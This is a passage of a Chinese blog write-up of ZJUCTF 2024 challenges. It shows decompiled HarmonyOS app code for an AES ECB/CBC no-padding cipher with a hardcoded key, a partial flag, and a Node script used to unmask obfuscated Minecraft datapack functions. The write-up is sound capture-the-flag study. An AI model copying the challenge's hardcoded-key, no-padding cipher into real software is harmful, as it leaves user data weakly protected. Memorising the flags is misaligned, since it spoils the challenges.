class="operator">=</span> obj.init(<span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>.CryptoMode.ENCRYPT_MODE, arg0, _lexenv_0_0_);</span><br><span class="line">        <span class="keyword">return</span> init.then(#<span class="number">4</span>#);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #<span class="number">4</span>#(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> _lexenv_0_3_.cipherY;</span><br><span class="line">        <span class="keyword">return</span> obj.doFinal(_lexenv_0_1_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #<span class="number">5</span>#(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        arg0(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #<span class="number">6</span>#(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        newlexenv(<span class="number">1</span>);</span><br><span class="line">        _lexenv_0_0_ = arg0;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldlexvar</span> <span class="operator">=</span> _lexenv_1_5_;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">encryptX</span> <span class="operator">=</span> ldlexvar.encryptX(_lexenv_1_0_);</span><br><span class="line">        encryptX.then(#<span class="number">7</span>#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #<span class="number">7</span>#(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        _lexenv_1_1_ = arg0.data;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldlexvar</span> <span class="operator">=</span> _lexenv_1_5_;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">encryptY</span> <span class="operator">=</span> ldlexvar.encryptY(_lexenv_1_2_, _lexenv_1_1_);</span><br><span class="line">        encryptY.then(#<span class="number">8</span>#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #<span class="number">8</span>#(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        _lexenv_1_3_ = arg0.data;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldlexvar</span> <span class="operator">=</span> _lexenv_1_5_;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">encodeX</span> <span class="operator">=</span> ldlexvar.encodeX(_lexenv_1_1_, _lexenv_1_3_);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldlexvar2</span> <span class="operator">=</span> _lexenv_1_5_;</span><br><span class="line">        _lexenv_0_0_(ldlexvar2.encodeY(encodeX));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">init</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">cryptoFramework</span> <span class="operator">=</span> <span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.cipherX = cryptoFramework.createCipher(<span class="built_in">this</span>.cipherAlgX);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">cryptoFramework2</span> <span class="operator">=</span> <span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.cipherY = cryptoFramework2.createCipher(<span class="built_in">this</span>.cipherAlgY);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createobjectwithbuffer([<span class="string">&quot;data&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj.data = <span class="built_in">this</span>.stringToUint8Array(<span class="built_in">this</span>.commonCipherKeyStr);</span><br><span class="line">        <span class="built_in">this</span>.commonCipherKey = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r14v24, types: [int] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r14v26, types: [int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">encodeX</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0, Object arg1)</span> &#123;</span><br><span class="line">        Object[] objArr = [Object];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; isfalse((i &lt; <span class="number">16</span> ? <span class="number">1</span> : <span class="number">0</span>)) == <span class="literal">null</span>; i++) &#123;</span><br><span class="line">            objArr.push(arg0[i] ^ arg1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; isfalse((i2 &lt; <span class="number">16</span> ? <span class="number">1</span> : <span class="number">0</span>)) == <span class="literal">null</span>; i2++) &#123;</span><br><span class="line">            objArr.push(arg1[i2]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Uint8Array(objArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r6v2, types: [Object, java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">encodeY</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">newobjrange</span> <span class="operator">=</span> <span class="keyword">import</span> &#123; <span class="keyword">default</span> as util &#125; from <span class="string">&quot;@ohos:util&quot;</span>.Base64Helper();</span><br><span class="line">        <span class="keyword">return</span> newobjrange.encodeToStringSync(arg0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">encrypt</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0)</span> &#123;</span><br><span class="line">        newlexenv(<span class="number">6</span>);</span><br><span class="line">        _lexenv_0_4_ = newTarget;</span><br><span class="line">        _lexenv_0_5_ = <span class="built_in">this</span>;</span><br><span class="line">        _lexenv_0_3_ = <span class="literal">null</span>;</span><br><span class="line">        _lexenv_0_1_ = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (isfalse((arg0.length != <span class="number">32</span> ? <span class="number">1</span> : <span class="number">0</span>)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Promise(#<span class="number">5</span>#);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldlexvar</span> <span class="operator">=</span> _lexenv_0_5_;</span><br><span class="line">        _lexenv_0_0_ = ldlexvar.stringToUint8Array(arg0.slice(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldlexvar2</span> <span class="operator">=</span> _lexenv_0_5_;</span><br><span class="line">        _lexenv_0_2_ = ldlexvar2.stringToUint8Array(arg0.slice(<span class="number">16</span>, <span class="number">32</span>));</span><br><span class="line">        <span class="keyword">return</span> Promise(#<span class="number">6</span>#);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">encryptX</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0)</span> &#123;</span><br><span class="line">        newlexenv(<span class="number">3</span>);</span><br><span class="line">        _lexenv_0_1_ = newTarget;</span><br><span class="line">        _lexenv_0_2_ = <span class="built_in">this</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createobjectwithbuffer([<span class="string">&quot;data&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj.data = arg0;</span><br><span class="line">        _lexenv_0_0_ = obj;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">cryptoFramework</span> <span class="operator">=</span> <span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">createSymKeyGenerator</span> <span class="operator">=</span> cryptoFramework.createSymKeyGenerator(_lexenv_0_2_.cipherAlgName);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">convertKey</span> <span class="operator">=</span> createSymKeyGenerator.convertKey(_lexenv_0_2_.commonCipherKey);</span><br><span class="line">        <span class="keyword">return</span> convertKey.then(#<span class="number">1</span>#);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">encryptY</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0, Object arg1)</span> &#123;</span><br><span class="line">        newlexenv(<span class="number">4</span>);</span><br><span class="line">        _lexenv_0_2_ = newTarget;</span><br><span class="line">        _lexenv_0_3_ = <span class="built_in">this</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createobjectwithbuffer([<span class="string">&quot;data&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj.data = arg0;</span><br><span class="line">        _lexenv_0_1_ = obj;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> createobjectwithbuffer([<span class="string">&quot;algName&quot;</span>, <span class="string">&quot;IvParamsSpec&quot;</span>, <span class="string">&quot;iv&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> createobjectwithbuffer([<span class="string">&quot;data&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj3.data = arg1;</span><br><span class="line">        obj2.iv = obj3;</span><br><span class="line">        _lexenv_0_0_ = obj2;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">cryptoFramework</span> <span class="operator">=</span> <span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">createSymKeyGenerator</span> <span class="operator">=</span> cryptoFramework.createSymKeyGenerator(_lexenv_0_3_.cipherAlgName);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">convertKey</span> <span class="operator">=</span> createSymKeyGenerator.convertKey(_lexenv_0_3_.commonCipherKey);</span><br><span class="line">        <span class="keyword">return</span> convertKey.then(#<span class="number">3</span>#);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">CipherUtil</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cipherAlgName = <span class="string">&quot;AES128&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.cipherAlgX = <span class="string">&quot;AES128|ECB|NoPadding&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.cipherAlgY = <span class="string">&quot;AES128|CBC|NoPadding&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.commonCipherKeyStr = <span class="string">&quot;ZJUCTF2024-OHAPP&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.init();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">func_main_0</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">CipherUtil</span> <span class="operator">=</span> hole.CipherUtil(Object2, Object3, hole, [<span class="string">&quot;init&quot;</span>, <span class="string">&quot;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.init&quot;</span>, <span class="number">0</span>, <span class="string">&quot;encryptX&quot;</span>, <span class="string">&quot;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encryptX&quot;</span>, <span class="number">1</span>, <span class="string">&quot;encryptY&quot;</span>, <span class="string">&quot;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encryptY&quot;</span>, <span class="number">2</span>, <span class="string">&quot;encodeX&quot;</span>, <span class="string">&quot;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encodeX&quot;</span>, <span class="number">2</span>, <span class="string">&quot;encodeY&quot;</span>, <span class="string">&quot;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encodeY&quot;</span>, <span class="number">1</span>, <span class="string">&quot;encrypt&quot;</span>, <span class="string">&quot;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.encrypt&quot;</span>, <span class="number">1</span>, <span class="string">&quot;stringToUint8Array&quot;</span>, <span class="string">&quot;com.zjuctf2024.easyhap/entry/ets/cipherUtil/CipherUtil.stringToUint8Array&quot;</span>, <span class="number">1</span>, <span class="number">7</span>]);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> CipherUtil.prototype;</span><br><span class="line">        _module_0_ = CipherUtil;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">stringToUint8Array</span><span class="params">(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">import</span> &#123; <span class="keyword">default</span> as buffer &#125; from <span class="string">&quot;@ohos:buffer&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Uint8Array(buffer.from(arg0, <span class="string">&quot;utf-8&quot;</span>).buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有两个部分，第一个部分是初始化了加密器，AES128|ECB|NoPadding，以及AES128|CBC|NoPadding</p>
+<p>第二个部分是对输入的数据切成两块，一块用AES128|ECB|NoPadding加密，加密完数据作为iv，提供给AES128|CBC|NoPadding用来加密第二块数据，加密完做了一个异或操作，然后转成base64</p>
+<p>直接往cyberchef里面拖呗</p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p15.png"></p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p14.png"></p>
+<p>flag为<code>ZJUCTF&#123;????????????????D_a_5iMPl3_fl4g&#125;</code><del>（前一段没截图，忘了，不想重逆一次了（猜你想说：你无敌了））</del></p>
+<h1 id="Minec-re-tf"><a href="#Minec-re-tf" class="headerlink" title="Minec(re)tf"></a>Minec(re)tf</h1><p>虽然没有做出来，但是做的过程很爽，分享一下<del>非预期</del>解法</p>
+<p>Piece 1:</p>
+<p>发现<code>/datapacks/world/data/main/recipes/flag_look_at_the_code_of_the_recipe.json</code>，运行其中说的函数，得到flag piece 1</p>
+<p>Piece 2 &amp; 3 :</p>
+<p>真的感觉很抽象：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read all files under &#x27;./obfuscation/functions&#x27;</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Path</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;./world/data/obfuscation/functions&#x27;</span>);</span><br><span class="line"></span><br><span class="line">fs.<span class="title function_">readdir</span>(<span class="title class_">Path</span>, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">  files.<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(<span class="title class_">Path</span>, file);</span><br><span class="line">    <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(filePath, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    fs.<span class="title function_">writeFileSync</span>(filePath, <span class="string">&quot;say Fuck I&#x27;m &quot;</span>+file+<span class="string">&quot;! \n&quot;</span>+data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>在每一个混淆函数前面加一句话，让他说出自己是什么函数，再启动游戏，于是乎两个混淆后的函数就露出马脚了，直接取出flag piece</p>
+<p>Piece 9 :</p>
+<p>把<code>&#125;</code>转成base64发现最后一个字符必是9，于是乎在混淆的函数里搜索<code>Flag Piece\[9\/9\]:.......9</code>(Regex)，直接薄纱（后来发现obfuscation里面Flag Piece 9&#x2F;9好像本来就只有一个函数qwq</p>
+<p>Piece 4</p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p16.png" alt="按修改时间排序"></p>
+<p>有一个model是特殊的，究竟是谁捏，好难猜啊（</p>
+<p>然后按提示安装blockbench，查看</p>
+<p>Piece 5</p>
+<p>直接反编译模组jar，<del>rev方向签到题</del></p>
+<p>Piece 7 用指令，Piece 8 用结构方块，这几个应该和预期解大差不差</p>
+<p>Piece 6 不会</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/arch/bookshelf-2024-10-zhejiangjingshen.html" rel="prev" title="《浙江精神与浙江发展》读书笔记">
+                  <i class="fa fa-chevron-left"></i> 《浙江精神与浙江发展》读书笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/arch/2024-10-dump-the-real-judger-of-PTA.html" rel="next" title="输出PTA的实际裁判程序">
+                  输出PTA的实际裁判程序 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+
+
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">5dbwat4</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdnjs.cloudflare.com/ajax/libs/ribbon.js/1.0.2/ribbon.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+
+
+
+
+  <!--Live2D-->
+
+ <!-- <script src="/assets/live2d/l2dw.js"></script>
+  <script src="/assets/live2d/l2dw-wtip.js"></script>
+  <script src="/assets/live2d/controlCore.js"></script>-->
+
+</body>
+</html>
